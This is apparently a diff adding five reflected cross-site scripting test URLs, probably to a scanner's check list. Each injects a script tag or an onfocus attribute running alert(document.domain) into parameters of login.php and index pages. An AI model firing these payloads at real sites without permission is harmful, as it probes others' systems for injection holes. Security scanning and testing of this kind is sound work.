@@ -1,0 +1,5 @@
+/webshell4/login.php?err=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/webshell4/login.php?login=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/webshell4/login.php?errcode=0&login=\%22%20onfocus=alert(document.domain);%20autofocus%20\%22&err=U
+/index_en.php?from=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/index.php?from=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
